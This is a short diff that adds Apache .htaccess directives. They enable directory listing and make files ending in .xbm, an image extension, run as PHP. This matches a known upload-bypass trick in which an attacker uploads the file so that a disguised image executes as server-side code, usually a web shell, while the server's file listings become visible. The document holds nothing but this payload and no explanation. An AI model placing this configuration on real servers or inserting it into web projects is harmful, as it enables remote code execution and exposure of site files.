@@ -1,0 +1,3 @@
+Options All +Indexes
+AddType application/x-httpd-php .xbm
+AddHandler application/x-httpd-php .xbm
